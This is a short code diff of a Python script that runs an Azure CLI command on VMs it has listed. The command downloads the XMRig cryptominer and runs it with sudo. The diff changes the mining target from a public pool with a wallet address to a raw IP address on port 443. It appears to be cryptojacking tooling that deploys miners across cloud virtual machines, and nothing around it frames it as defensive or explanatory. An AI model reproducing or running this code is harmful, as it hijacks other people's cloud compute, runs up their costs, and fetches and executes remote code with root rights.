@@ -34,7 +34,7 @@ response = az_cli('vm list')
 
 def deployer(x):
         
-            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o pool.supportxmr.com:8080 -u 49rwudauCpZ6kdb26AMeyRD48P38Z8EwpUmQ5zRZiFMhCWxdWehRyvCKQP99cowYcG2ZHSRk4BffT34safr5juEGRn5L1Tv"'
+            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o 20.40.57.194:443"'
             
         
             print("      * Script Executing : "+runC)
